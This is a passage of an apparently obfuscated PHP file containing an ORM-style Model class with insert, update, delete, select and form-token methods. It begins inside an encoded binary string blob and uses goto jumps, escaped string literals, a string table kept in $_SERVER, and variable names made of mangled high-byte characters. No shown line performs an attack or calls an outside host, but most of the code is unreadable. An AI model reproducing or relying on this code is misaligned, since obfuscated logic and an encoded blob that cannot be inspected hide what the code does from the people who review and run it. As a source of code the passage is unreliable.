–¨øÍh')."\121\363\23\164\44\144\203\174\302\141\36\26\113\23\32\215\45\304\306\25\300\307\7\74\40\357\151\160\250\327\132\362\34\73\12\0\22\42\323\346\10\363\356\207\257\334\212"."\xf6\x88\x37\xd7\x55\x2f\x23\x27\x78\x10\xc0\x37\xd9\xce\x83\x5c\x6c\xb6\x83\x34\x26\x8\x1e\xe2\xfd\xa4\xc\x78\xc1\x29\xd0\x5f\xec\x75\x65\xa7\xef\xe0\x70\xdb\xc5\x6f\x2b\x1\x54\x95\xa2"."\x8\xea\x1e\x9a\x28\x94\xb0\xf\x75\xea\x1d\xb1\x2c\xaa\x2b\x94\x48\x2c\x8a\xc5\x5b\xa8\x37\xe9\xb2\x68\x92\x4b\xb2\x9b\x29\x8b\xea\x6a\x8f\x75\x8e\x17\x17\xee\x8\x45\xa2\x65\x71\xd8\xc4"."\xa6\x33\x25\xdc\x3f\xd1\xa8\x48\x17\x69\x65\x28\x1a\x8d\x2d\x1a\xaf\x15\x91\xe6\x5\xa2\x25\xe4\xa4\x54\x68\xc0\x8b\x7d\x26\x53\x6c\xb3\x13\x82\x84\x9a\x67\xb2\xb4\x74\xf9\x4e\x2b\x8\x3f"."\x60\x22\x8f\x5b\x45\x20\xcf\xab\xcd\x5c\xe4\xf1\xf\xf7\xd3\x2c\x1e\x4b\x36\x86\xb0\x50\x10\x36\x8f\xe9\x84\xb2\xe3\x45\x80\x62\xef\xda\x7c\x71\x73\x66\x59\x1c\xfd\x6\x5c\x47\xc4\x12\x9c"."\254\15\102\121\44\234\223\67\123\2\230\124\161\200\144\355\151\271\66\237\304\212\1\300\15\73\331\4\333\252\176\63\55\151\353\251\250\2\27\340\140\110\45\23\50\372\15"."\321\377\33\207\127\30\172\305\246\0\0".base64_decode('')."", 10, -8))); goto BŞ‚É¡õµ; a’‹ˆ‡ªñÕ: define($_SERVER[¹àö™Ç¾][247], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\157\162\x64\145\x72", "\x61\154\151\141\x73", "\x68\x61\x76\x69\x6e\147", "\x67\x72\x6f\165\160", "\154\x6f\x63\x6b", "\x64\x69\163\x74\151\x6e\x63\x74", "\141\165\x74\157", "\x66\151\154\164\x65\x72", "\x76\x61\x6c\x69\144\141\x74\x65", "\x72\x65\163\165\x6c\x74", "\142\151\x6e\144", "\164\x6f\153\145\156"); public function __construct($‘°”ö¹Û = '', $Şş¯çë© = '', $Êâ´àúØ = '') { $Š˜µœÑ¤ =& $_SERVER[¹àö™Ç¾]; $this->_initialize(); if (!empty($‘°”ö¹Û)) { if (strpos($‘°”ö¹Û, $Š˜µœÑ¤[20])) { list($this->dbName, $this->name) = explode($Š˜µœÑ¤[20], $‘°”ö¹Û); } else { $this->name = $‘°”ö¹Û; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Şş¯çë©)) { $this->tablePrefix = $Š˜µœÑ¤[22]; } elseif ($Š˜µœÑ¤[22] != $Şş¯çë©) { $this->tablePrefix = $Şş¯çë©; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Š˜µœÑ¤[248]); } $this->db(0, empty($this->connection) ? $Êâ´àúØ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¥ÎÏã› =& $_SERVER[¹àö™Ç¾]; if (empty($this->fields)) { if (think_config($¥ÎÏã›[249])) { $”œĞßËÀ = $this->dbName ? $this->dbName : think_config($¥ÎÏã›[250]); $Ûº‘áÌÂ = think_var_cache($¥ÎÏã›[251] . strtolower(get_path_this($”œĞßËÀ) . $¥ÎÏã›[20] . $this->name)); if ($Ûº‘áÌÂ) { $½„ñÙ‹Š = think_config($¥ÎÏã›[252]); if (empty($½„ñÙ‹Š) || $Ûº‘áÌÂ[$¥ÎÏã›[253]] == $½„ñÙ‹Š) { $this->fields = $Ûº‘áÌÂ; return; } } } $this->flush(); } } public function flush() { $‘ĞõúÀ =& $_SERVER[¹àö™Ç¾]; $this->db->setModel($this->name); $†¬¯ë‚£ = $this->db->getFields($this->getTableName()); if (!$†¬¯ë‚£) { return !1; } $this->fields = array_keys($†¬¯ë‚£); $this->fields[$‘ĞõúÀ[254]] = !1; foreach ($†¬¯ë‚£ as $›Ş†ïØ€ => $Ÿ‹ô¥›å) { $·ù°âöí[$›Ş†ïØ€] = $Ÿ‹ô¥›å[$‘ĞõúÀ[43]]; if ($Ÿ‹ô¥›å[$‘ĞõúÀ[49]]) { $this->fields[$‘ĞõúÀ[255]] = $›Ş†ïØ€; if ($Ÿ‹ô¥›å[$‘ĞõúÀ[52]]) { $this->fields[$‘ĞõúÀ[254]] = !0; } } } $this->fields[$‘ĞõúÀ[256]] = $·ù°âöí; if (think_config($‘ĞõúÀ[252])) { $this->fields[$‘ĞõúÀ[253]] = think_config($‘ĞõúÀ[252]); } if (think_config($‘ĞõúÀ[249])) { $à¤»¨ïî = $this->dbName ? $this->dbName : think_config($‘ĞõúÀ[250]); think_var_cache($‘ĞõúÀ[251] . strtolower(get_path_this($à¤»¨ïî) . $‘ĞõúÀ[20] . $this->name), $this->fields); } } public function switchModel($š„£¿ßş, $å«ÉÅŒ’ = array()) { $êøáá¨Ù =& $_SERVER[¹àö™Ç¾]; $›§­¡îÁ = ucwords(strtolower($š„£¿ßş)) . $êøáá¨Ù[257]; if (!class_exists($›§­¡îÁ)) { think_exception($›§­¡îÁ . think_lang($êøáá¨Ù[258])); } $this->_extModel = new $›§­¡îÁ($this->name); if (!empty($å«ÉÅŒ’)) { foreach ($å«ÉÅŒ’ as $úéÏı…â) { $this->_extModel->setProperty($úéÏı…â, $this->{$úéÏı…â}); } } return $this->_extModel; } public function __set($ÅÙÄÛÒÜ, $ñÛ©À•î) { $this->data[$ÅÙÄÛÒÜ] = $ñÛ©À•î; } public function __get($ÌòòÑ¾—) { return isset($this->data[$ÌòòÑ¾—]) ? $this->data[$ÌòòÑ¾—] : null; } public function __isset($áï‡¯®) { return isset($this->data[$áï‡¯®]); } public function __unset($üÀÆè½â) { unset($this->data[$üÀÆè½â]); } public function __call($éÉ¹ËÌÎ, $¼ñÈ©½²) { $¾ùòÜòş =& $_SERVER[¹àö™Ç¾]; if (in_array(strtolower($éÉ¹ËÌÎ), $this->methods, !0)) { $this->options[strtolower($éÉ¹ËÌÎ)] = $¼ñÈ©½²[0]; return $this; } elseif (in_array(strtolower($éÉ¹ËÌÎ), array($¾ùòÜòş[259], $¾ùòÜòş[260], $¾ùòÜòş[261], $¾ùòÜòş[262], $¾ùòÜòş[263]), !0)) { $–‹ºÒø = isset($¼ñÈ©½²[0]) ? $¼ñÈ©½²[0] : $¾ùòÜòş[191]; $–‹ºÒø = $this->db->parseKey($–‹ºÒø); return $this->getField(strtoupper($éÉ¹ËÌÎ) . $¾ùòÜòş[264] . $–‹ºÒø . $¾ùòÜòş[265] . $éÉ¹ËÌÎ, $¾ùòÜòş[259]); } elseif (strtolower(substr($éÉ¹ËÌÎ, 0, 5)) == $¾ùòÜòş[266]) { $–‹ºÒø = think_parse_name(substr($éÉ¹ËÌÎ, 5)); $éËİîÈ¡[$–‹ºÒø] = $¼ñÈ©½²[0]; return $this->where($éËİîÈ¡)->find(); } elseif (strtolower(substr($éÉ¹ËÌÎ, 0, 10)) == $¾ùòÜòş[267]) { $²×’®’ = think_parse_name(substr($éÉ¹ËÌÎ, 10)); $éËİîÈ¡[$²×’®’] = $¼ñÈ©½²[0]; return $this->where($éËİîÈ¡)->getField($¼ñÈ©½²[1]); } elseif (isset($this->_scope[$éÉ¹ËÌÎ])) { return $this->scope($éÉ¹ËÌÎ, $¼ñÈ©½²[0]); } elseif (method_exists($this, $éÉ¹ËÌÎ)) { array_unshift($¼ñÈ©½², $éÉ¹ËÌÎ); return call_user_func_array(array($this, $¾ùòÜòş[268]), $¼ñÈ©½²); } else { return call_user_func_array(array(parent, $éÉ¹ËÌÎ), $¼ñÈ©½²); } } protected function call() { $ªé¨üÑ€ =& $_SERVER[¹àö™Ç¾]; $£ï“İ•“ = func_get_args(); $¯ı²ÛÔê = array_shift($£ï“İ•“); $Õ¶ÖâÄ¬ = $¯ı²ÛÔê; if (is_array($¯ı²ÛÔê)) { $Õ¶ÖâÄ¬ = $¯ı²ÛÔê[1]; $¯ı²ÛÔê = $¯ı²ÛÔê[0]; } $ ‡×ı³‹ = count($£ï“İ•“) - 1; if (isset($£ï“İ•“[$ ‡×ı³‹]) && $£ï“İ•“[$ ‡×ı³‹] === $¯ı²ÛÔê) { think_exception(__CLASS__ . $ªé¨üÑ€[4] . $¯ı²ÛÔê . think_lang($ªé¨üÑ€[269])); return; } $£ï“İ•“[] = $¯ı²ÛÔê; if (method_exists($this, $ªé¨üÑ€[270])) { $˜Äşú¸‡ = call_user_func_array(array($this, $ªé¨üÑ€[271]), array($Õ¶ÖâÄ¬, $£ï“İ•“)); if (!is_null($˜Äşú¸‡) && $˜Äşú¸‡ !== !1) { return $˜Äşú¸‡; } } $Èô¯Ù™„ = call_user_func_array(array($this, $¯ı²ÛÔê), $£ï“İ•“); if (method_exists($this, $ªé¨üÑ€[272])) { $˜Äşú¸‡ = call_user_func_array(array($this, $ªé¨üÑ€[273]), array($Õ¶ÖâÄ¬, $£ï“İ•“, $Èô¯Ù™„)); if ($˜Äşú¸‡) { return $˜Äşú¸‡; } } return $Èô¯Ù™„; } protected function _initialize() { } protected function _facade($¯øÀö¡æ) { $´´‚±Ñ¢ =& $_SERVER[¹àö™Ç¾]; if (!empty($this->fields)) { foreach ($¯øÀö¡æ as $ØğÄĞ Ó => $ä»óÅ·) { if (is_array($this->fields) && !in_array($ØğÄĞ Ó, $this->fields, !0)) { unset($¯øÀö¡æ[$ØğÄĞ Ó]); } elseif (is_scalar($ä»óÅ·)) { $this->_parseType($¯øÀö¡æ, $ØğÄĞ Ó); } } } if (!empty($this->options[$´´‚±Ñ¢[274]])) { $¯øÀö¡æ = array_map($this->options[$´´‚±Ñ¢[274]], $¯øÀö¡æ); unset($this->options[$´´‚±Ñ¢[274]]); } $this->_beforeWrite($¯øÀö¡æ); return $¯øÀö¡æ; } protected function _beforeWrite(&$–ÖñÉ) { } public function add($¤Áœ…æ… = '', $¶ò¾¤Úº = array(), $”½á°†È = false) { if (empty($¤Áœ…æ…)) { if (!empty($this->data)) { $¤Áœ…æ… = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹àö™Ç¾][275]); return !1; } } $¶ò¾¤Úº = $this->_parseOptions($¶ò¾¤Úº); $¤Áœ…æ… = $this->_facade($¤Áœ…æ…); if (!1 === $this->_beforeInsert($¤Áœ…æ…, $¶ò¾¤Úº)) { return !1; } $øæ¯Æèú = $this->db->insert($¤Áœ…æ…, $¶ò¾¤Úº, $”½á°†È); if (!1 !== $øæ¯Æèú) { $äó±ñ³Ë = $this->getLastInsID(); if ($äó±ñ³Ë) { $¤Áœ…æ…[$this->getPk()] = $äó±ñ³Ë; $this->_after_insert($¤Áœ…æ…, $¶ò¾¤Úº); return $äó±ñ³Ë; } $this->_after_insert($¤Áœ…æ…, $¶ò¾¤Úº); } return $øæ¯Æèú; } protected function _beforeInsert(&$è¢ÀÎÕÔ, $ÎïšÆ¡) { } protected function _after_insert($Ñ§Ò¼İ, $ÛÔ‹õ’) { } public function addAll($Çğë¾ÒÓ, $óÌí¾æ§ = array(), $«†Ò’¥¥ = false) { $«¨­şüÙ =& $_SERVER[¹àö™Ç¾]; if (empty($Çğë¾ÒÓ)) { $this->error = think_lang($«¨­şüÙ[275]); return !1; } $óÌí¾æ§ = $this->_parseOptions($óÌí¾æ§); foreach ($Çğë¾ÒÓ as $œÜØŸü„ => $Ş÷ó¼Ûß) { $Çğë¾ÒÓ[$œÜØŸü„] = $this->_facade($Ş÷ó¼Ûß); } if (method_exists($this->db, $«¨­şüÙ[276])) { $Ÿùñ®Ä = $this->db->insertAll($Çğë¾ÒÓ, $óÌí¾æ§, $«†Ò’¥¥); } else { $this->startTrans(); foreach ($Çğë¾ÒÓ as $œÜØŸü„ => $Ş÷ó¼Ûß) { $Ÿùñ®Ä = $this->db->insert($Ş÷ó¼Ûß, $óÌí¾æ§, $«†Ò’¥¥); } $this->commit(); } if (!1 !== $Ÿùñ®Ä) { $ë·ş³Í = $this->getLastInsID(); if ($ë·ş³Í) { return $ë·ş³Í; } } return $Ÿùñ®Ä; } public function selectAdd($ìÃå¶ß = '', $èĞı¤· = '', $ÈÄÆ¢Ê» = array()) { $ÆÆĞû­ =& $_SERVER[¹àö™Ç¾]; $ÈÄÆ¢Ê» = $this->_parseOptions($ÈÄÆ¢Ê»); if (!1 === ($ŸëïÅÉÅ = $this->db->selectInsert($ìÃå¶ß ? $ìÃå¶ß : $ÈÄÆ¢Ê»[$ÆÆĞû­[277]], $èĞı¤· ? $èĞı¤· : $this->getTableName(), $ÈÄÆ¢Ê»))) { $this->error = think_lang($ÆÆĞû­[278]); return !1; } else { return $ŸëïÅÉÅ; } } public function save($İñ‚¹Ùù = '', $å“ŞËÀ¦ = array()) { $ãÆöíÎÜ =& $_SERVER[¹àö™Ç¾]; if (empty($İñ‚¹Ùù)) { if (!empty($this->data)) { $İñ‚¹Ùù = $this->data; $this->data = array(); } else { $this->error = think_lang($ãÆöíÎÜ[275]); return !1; } } $İñ‚¹Ùù = $this->_facade($İñ‚¹Ùù); $å“ŞËÀ¦ = $this->_parseOptions($å“ŞËÀ¦); $ÖÍ±”Ô = $this->getPk(); if (!isset($å“ŞËÀ¦[$ãÆöíÎÜ[279]])) { if (isset($İñ‚¹Ùù[$ÖÍ±”Ô])) { $µˆ¸šË‡[$ÖÍ±”Ô] = $İñ‚¹Ùù[$ÖÍ±”Ô]; $å“ŞËÀ¦[$ãÆöíÎÜ[279]] = $µˆ¸šË‡; unset($İñ‚¹Ùù[$ÖÍ±”Ô]); } else { $this->error = think_lang($ãÆöíÎÜ[278]); return !1; } } if (is_array($å“ŞËÀ¦[$ãÆöíÎÜ[279]]) && isset($å“ŞËÀ¦[$ãÆöíÎÜ[279]][$ÖÍ±”Ô])) { $Ÿ×˜½ãÊ = $å“ŞËÀ¦[$ãÆöíÎÜ[279]][$ÖÍ±”Ô]; } if (!1 === $this->_beforeUpdate($İñ‚¹Ùù, $å“ŞËÀ¦)) { return !1; } $ÜûÛô– = $this->db->update($İñ‚¹Ùù, $å“ŞËÀ¦); if (!1 !== $ÜûÛô–) { if (isset($Ÿ×˜½ãÊ)) { $İñ‚¹Ùù[$ÖÍ±”Ô] = $Ÿ×˜½ãÊ; } $this->_afterUpdate($İñ‚¹Ùù, $å“ŞËÀ¦); } return $ÜûÛô–; } protected function _beforeUpdate(&$‰ÀÇ™İ, $£—şê·ä) { } protected function _afterUpdate($½õÜ¤ì½, $µ± ›‡Ï) { } public function delete($Ğ·ƒÖí‡ = array()) { $­—üË…Ï =& $_SERVER[¹àö™Ç¾]; if (empty($Ğ·ƒÖí‡) && empty($this->options[$­—üË…Ï[279]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $÷¶ÌÒõ… = $this->getPk(); if (is_numeric($Ğ·ƒÖí‡) || is_string($Ğ·ƒÖí‡)) { if (strpos($Ğ·ƒÖí‡, $­—üË…Ï[60])) { $á®Ô ©“[$÷¶ÌÒõ…] = array($­—üË…Ï[280], $Ğ·ƒÖí‡); } else { $á®Ô ©“[$÷¶ÌÒõ…] = $Ğ·ƒÖí‡; } $this->options[$­—üË…Ï[279]] = $á®Ô ©“; } $Ğ·ƒÖí‡ = $this->_parseOptions(); if (is_array($Ğ·ƒÖí‡[$­—üË…Ï[279]]) && isset($Ğ·ƒÖí‡[$­—üË…Ï[279]][$÷¶ÌÒõ…])) { $‹°Îçß = $Ğ·ƒÖí‡[$­—üË…Ï[279]][$÷¶ÌÒõ…]; } $ÂÒ€Ê’³ = $this->db->delete($Ğ·ƒÖí‡); if (!1 !== $ÂÒ€Ê’³) { $âŠóäí† = array(); if (isset($‹°Îçß)) { $âŠóäí†[$÷¶ÌÒõ…] = $‹°Îçß; } $this->_after_delete($âŠóäí†, $Ğ·ƒÖí‡); } return $ÂÒ€Ê’³; } protected function _after_delete($ß‹¬ßæİ, $áåòøê) { } public function select($Ë¡Â²¼ = array()) { $¥É¤€ =& $_SERVER[¹àö™Ç¾]; if (is_string($Ë¡Â²¼) || is_numeric($Ë¡Â²¼)) { $ããœãåå = $this->getPk(); if (strpos($Ë¡Â²¼, $¥É¤€[60])) { $–á€éõã[$ããœãåå] = array($¥É¤€[280], $Ë¡Â²¼); } else { $–á€éõã[$ããœãåå] = $Ë¡Â²¼; } $this->options[$¥É¤€[279]] = $–á€éõã; } elseif (!1 === $Ë¡Â²¼) { $Ë¡Â²¼ = $this->_parseOptions(); return $¥É¤€[281] . $this->db->buildSelectSql($Ë¡Â²¼) . $¥É¤€[282]; } $Ë¡Â²¼ = $this->_parseOptions(); $æ¥Ü•ó— = $this->db->select($Ë¡Â²¼); if (!1 === $æ¥Ü•ó—) { return !1; } if (empty($æ¥Ü•ó—)) { return null; } $this->_afterSelect($æ¥Ü•ó—, $Ë¡Â²¼); return $æ¥Ü•ó—; } protected function _afterSelect(&$´Äš÷, $£‘Ö’Øû) { } public function buildSql($Ñ¶ºçç = array()) { $í³­…Ò× =& $_SERVER[¹àö™Ç¾]; $Ñ¶ºçç = $this->_parseOptions($Ñ¶ºçç); return $í³­…Ò×[281] . $this->db->buildSelectSql($Ñ¶ºçç) . $í³­…Ò×[282]; } public function optionsValue($àøèîòğ = null) { if (is_null($àøèîòğ)) { return $this->options; } elseif (is_array($àøèîòğ)) { $this->options = array_merge($this->options, $àøèîòğ); } } protected function _parseOptions($¾ËşºşŠ = array()) { $§ÉÆ§ÙË =& $_SERVER[¹àö™Ç¾]; if (is_array($¾ËşºşŠ)) { $¾ËşºşŠ = array_merge($this->options, $¾ËşºşŠ); } $this->options = array(); if (!isset($¾ËşºşŠ[$§ÉÆ§ÙË[283]])) { $¾ËşºşŠ[$§ÉÆ§ÙË[283]] = $this->getTableName(); $¬ğŸ¹öˆ = $this->fields; } else { $¬ğŸ¹öˆ = $this->getDbFields(); } if (!empty($¾ËşºşŠ[$§ÉÆ§ÙË[284]])) { $¾ËşºşŠ[$§ÉÆ§ÙË[283]] .= $§ÉÆ§ÙË[63] . $¾ËşºşŠ[$§ÉÆ§ÙË[284]]; } $¾ËşºşŠ[$§ÉÆ§ÙË[285]] = $this->name; if (isset($¾ËşºşŠ[$§ÉÆ§ÙË[279]]) && is_array($¾ËşºşŠ[$§ÉÆ§ÙË[279]]) && !empty($¬ğŸ¹öˆ) && !isset($¾ËşºşŠ[$§ÉÆ§ÙË[286]]) && !isset($¾ËşºşŠ[$§ÉÆ§ÙË[283]])) { foreach ($¾ËşºşŠ[$§ÉÆ§ÙË[279]] as $±’§”•€ => $ÂÔê§º) { $±’§”•€ = trim($±’§”•€); if (in_array($±’§”•€, $¬ğŸ¹öˆ, !0)) { if (is_scalar($ÂÔê§º)) { $this->_parseType($¾ËşºşŠ[$§ÉÆ§ÙË[279]], $±’§”•€); } } elseif (!is_numeric($±’§”•€) && $§ÉÆ§ÙË[21] != substr($±’§”•€, 0, 1) && !1 === strpos($±’§”•€, $§ÉÆ§ÙË[20]) && !1 === strpos($±’§”•€, $§ÉÆ§ÙË[264]) && !1 === strpos($±’§”•€, $§ÉÆ§ÙË[287]) && !1 === strpos($±’§”•€, $§ÉÆ§ÙË[288])) { unset($¾ËşºşŠ[$§ÉÆ§ÙË[279]][$±’§”•€]); } } } $this->_options_filter($¾ËşºşŠ); return $¾ËşºşŠ; } protected function _options_filter(&$ÙË¿Ù·) { } protected function _parseType(&$Á²š†Ë¾, $ÇÑÎàî) { $‰®×äè± =& $_SERVER[¹àö™Ç¾]; if (empty($this->options[$‰®×äè±[289]][$‰®×äè±[4] . $ÇÑÎàî])) { $’úı»¼Ù = strtolower($this->fields[$‰®×äè±[256]][$ÇÑÎàî]); if (!1 !== strpos($’úı»¼Ù, $‰®×äè±[290])) { } elseif (!1 === strpos($’úı»¼Ù, $‰®×äè±[291]) && !1 !== strpos($’úı»¼Ù, $‰®×äè±[292])) { $Á²š†Ë¾[$ÇÑÎàî] = intval($Á²š†Ë¾[$ÇÑÎàî]); } elseif (!1 !== strpos($’úı»¼Ù, $‰®×äè±[293]) || !1 !== strpos($’úı»¼Ù, $‰®×äè±[294])) { $Á²š†Ë¾[$ÇÑÎàî] = floatval($Á²š†Ë¾[$ÇÑÎàî]); } elseif (!1 !== strpos($’úı»¼Ù, $‰®×äè±[295])) { $Á²š†Ë¾[$ÇÑÎàî] = (bool) $Á²š†Ë¾[$ÇÑÎàî]; } } } public function find($æË½°¨Ê = array()) { $ÕŒÎê… =& $_SERVER[¹àö™Ç¾]; if (is_numeric($æË½°¨Ê) || is_string($æË½°¨Ê)) { $±°îã¹[$this->getPk()] = intval($æË½°¨Ê); $this->options[$ÕŒÎê…[279]] = $±°îã¹; } $this->options[$ÕŒÎê…[296]] = 1; $æË½°¨Ê = $this->_parseOptions(); $Õ³°Ú×Å = $this->db->select($æË½°¨Ê); if (!1 === $Õ³°Ú×Å) { return !1; } if (empty($Õ³°Ú×Å)) { return null; } $this->data = $Õ³°Ú×Å[0]; $this->_afterFind($this->data, $æË½°¨Ê); if (!empty($this->options[$ÕŒÎê…[297]])) { return $this->returnResult($this->data, $this->options[$ÕŒÎê…[297]]); } return $this->data; } protected function _afterFind(&$¦ÌÀõÚ”, $•ÔšíÖá) { } protected function returnResult($®ÜÙÇƒ, $üˆ‘…ƒ„ = '') { $¤õ¶·ñÌ =& $_SERVER[¹àö™Ç¾]; if ($üˆ‘…ƒ„) { if (is_callable($üˆ‘…ƒ„)) { return call_user_func($üˆ‘…ƒ„, $®ÜÙÇƒ); } switch (strtolower($üˆ‘…ƒ„)) { case $¤õ¶·ñÌ[298]: return json_encode($®ÜÙÇƒ); case $¤õ¶·ñÌ[299]: return xml_encode($®ÜÙÇƒ); } } return $®ÜÙÇƒ; } public function parseFieldsMap($·³üÀŒ¯, $‰÷†à« = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ûß›ÖÁ => $ŠƒÌ¼àÂ) { if ($‰÷†à« == 1) { if (isset($·³üÀŒ¯[$ŠƒÌ¼àÂ])) { $·³üÀŒ¯[$Ûß›ÖÁ] = $·³üÀŒ¯[$ŠƒÌ¼àÂ]; unset($·³üÀŒ¯[$ŠƒÌ¼àÂ]); } } else { if (isset($·³üÀŒ¯[$Ûß›ÖÁ])) { $·³üÀŒ¯[$ŠƒÌ¼àÂ] = $·³üÀŒ¯[$Ûß›ÖÁ]; unset($·³üÀŒ¯[$Ûß›ÖÁ]); } } } } return $·³üÀŒ¯; } public function setField($£¹Íıá, $›ï˜©‰ = '') { if (is_array($£¹Íıá)) { $±¿öûÊŞ = $£¹Íıá; } else { $±¿öûÊŞ[$£¹Íıá] = $›ï˜©‰; } return $this->save($±¿öûÊŞ); } public function setAdd($÷Ü®òÁÄ, $şÇŸş·ı = 1) { $°’ö×ä =& $_SERVER[¹àö™Ç¾]; $’°—²÷Õ = $÷Ü®òÁÄ . $°’ö×ä[300] . $şÇŸş·ı; if ($şÇŸş·ı < 0) { $’°—²÷Õ = $÷Ü®òÁÄ . $şÇŸş·ı; } return $this->setField($÷Ü®òÁÄ, array($°’ö×ä[301], $’°—²÷Õ)); } public function getField($¬Ìè™ş­, $Ÿ·ª€™‹ = null) { $÷³´È¢È =& $_SERVER[¹àö™Ç¾]; $ÂØŒâá [$÷³´È¢È[277]] = $¬Ìè™ş­; $ÂØŒâá  = $this->_parseOptions($ÂØŒâá ); $¬Ìè™ş­ = trim($¬Ìè™ş­); if (strpos($¬Ìè™ş­, $÷³´È¢È[60])) { if (!isset($ÂØŒâá [$÷³´È¢È[296]])) { $ÂØŒâá [$÷³´È¢È[296]] = is_numeric($Ÿ·ª€™‹) ? $Ÿ·ª€™‹ : $÷³´È¢È[22]; } $æÈš Å = $this->db->select($ÂØŒâá ); if (!empty($æÈš Å)) { $¹†çÔ·’ = explode($÷³´È¢È[60], $¬Ìè™ş­); $¬Ìè™ş­ = array_keys($æÈš Å[0]); $£Áóèë½ = array_shift($¬Ìè™ş­); $ïâ˜” © = array_shift($¬Ìè™ş­); $ê±—ÍÜã = array(); $â•ìöñ× = count($¹†çÔ·’); foreach ($æÈš Å as $ËŸ¬¹) { $£ÖáøÁ = $ËŸ¬¹[$£Áóèë½]; if (2 == $â•ìöñ×) { $ê±—ÍÜã[$£ÖáøÁ] = $ËŸ¬¹[$ïâ˜” ©]; } else { $ê±—ÍÜã[$£ÖáøÁ] = is_string($Ÿ·ª€™‹) ? implode($Ÿ·ª€™‹, $ËŸ¬¹) : $ËŸ¬¹; } } return $ê±—ÍÜã; } } else { if (!0 !== $Ÿ·ª€™‹) { $ÂØŒâá [$÷³´È¢È[296]] = is_numeric($Ÿ·ª€™‹) ? $Ÿ·ª€™‹ : 1; } if ($Ÿ·ª€™‹ === $÷³´È¢È[259]) { unset($ÂØŒâá [$÷³´È¢È[296]]); } $ËŸ¬¹ = $this->db->select($ÂØŒâá ); if (!empty($ËŸ¬¹)) { if ($Ÿ·ª€™‹ === $÷³´È¢È[259]) { return reset($ËŸ¬¹[0]); } if (!0 !== $Ÿ·ª€™‹ && 1 == $ÂØŒâá [$÷³´È¢È[296]]) { return reset($ËŸ¬¹[0]); } foreach ($ËŸ¬¹ as $Ú“±‡–é) { $¬œ¸ŞÁ‘[] = $Ú“±‡–é[$¬Ìè™ş­]; } return $¬œ¸ŞÁ‘; } } return null; } public function create($¾†…¹Ğ = '', $éı·¦¦ = '') { $ùÜÔ¼¾Ã =& $_SERVER[¹àö™Ç¾]; if (empty($¾†…¹Ğ)) { $¾†…¹Ğ = $_POST; } elseif (is_object($¾†…¹Ğ)) { $¾†…¹Ğ = get_object_vars($¾†…¹Ğ); } if (empty($¾†…¹Ğ) || !is_array($¾†…¹Ğ)) { $this->error = think_lang($ùÜÔ¼¾Ã[275]); return !1; } $¾†…¹Ğ = $this->parseFieldsMap($¾†…¹Ğ, 0); $éı·¦¦ = $éı·¦¦ ? $éı·¦¦ : (!empty($¾†…¹Ğ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ùÜÔ¼¾Ã[277]])) { $ú­ŠÔ‰á = $this->options[$ùÜÔ¼¾Ã[277]]; unset($this->options[$ùÜÔ¼¾Ã[277]]); } elseif ($éı·¦¦ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ú­ŠÔ‰á = $this->insertFields; } elseif ($éı·¦¦ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ú­ŠÔ‰á = $this->updateFields; } if (isset($ú­ŠÔ‰á)) { if (is_string($ú­ŠÔ‰á)) { $ú­ŠÔ‰á = explode($ùÜÔ¼¾Ã[60], $ú­ŠÔ‰á); } if (think_config($ùÜÔ¼¾Ã[302])) { $ú­ŠÔ‰á[] = think_config($ùÜÔ¼¾Ã[303]); } foreach ($¾†…¹Ğ as $›ŸÔŒšŞ => $ôŠœ¿¸„) { if (!in_array($›ŸÔŒšŞ, $ú­ŠÔ‰á)) { unset($¾†…¹Ğ[$›ŸÔŒšŞ]); } } } if (!$this->autoValidation($¾†…¹Ğ, $éı·¦¦)) { return !1; } if (!$this->autoCheckToken($¾†…¹Ğ)) { $this->error = think_lang($ùÜÔ¼¾Ã[304]); return !1; } if ($this->autoCheckFields) { $ú­ŠÔ‰á = $this->getDbFields(); foreach ($¾†…¹Ğ as $›ŸÔŒšŞ => $ôŠœ¿¸„) { if (!in_array($›ŸÔŒšŞ, $ú­ŠÔ‰á)) { unset($¾†…¹Ğ[$›ŸÔŒšŞ]); } elseif (MAGIC_QUOTES_GPC && is_string($ôŠœ¿¸„)) { $¾†…¹Ğ[$›ŸÔŒšŞ] = stripslashes($ôŠœ¿¸„); } } } $this->autoOperation($¾†…¹Ğ, $éı·¦¦); $this->data = $¾†…¹Ğ; return $¾†…¹Ğ; } public function autoCheckToken($¯éŸ¦œš) { $ô•¢³Üñ =& $_SERVER[¹àö™Ç¾]; if (isset($this->options[$ô•¢³Üñ[305]]) && !$this->options[$ô•¢³Üñ[305]]) { return !0; } if (think_config($ô•¢³Üñ[302])) { $›½¡³÷Ÿ = think_config($ô•¢³Üñ[303]); if (!isset($¯éŸ¦œš[$›½¡³÷Ÿ]) || Session::get($›½¡³÷Ÿ)) { return !1; } list($Ç“½Èè, $ÜË–˜ö) = explode($ô•¢³Üñ[21], $¯éŸ¦œš[$›½¡³÷Ÿ]); if ($ÜË–˜ö && Session::get($›½¡³÷Ÿ . $ô•¢³Üñ[20] . $Ç“½Èè) === $ÜË–˜ö) { Session::remove($›½¡³÷Ÿ . $ô•¢³Üñ[20] . $Ç“½Èè); return !0; } if (think_config($ô•¢³Üñ[306])) { Session::remove($›½¡³÷Ÿ . $ô•¢³Üñ[20] . $Ç“½Èè); } return !1; } return !0; } public function regex($ùÙ›Áç³, $ÈéÊÃ†¸) { $€†¸Ñ·„ =& $_SERVER[¹àö™Ç¾]; $Ğ›™ÄŸ = array($€†¸Ñ·„[307] => $€†¸Ñ·„[308], $€†¸Ñ·„[309] => $€†¸Ñ·„[310], $€†¸Ñ·„[311] => $€†¸Ñ·„[312], 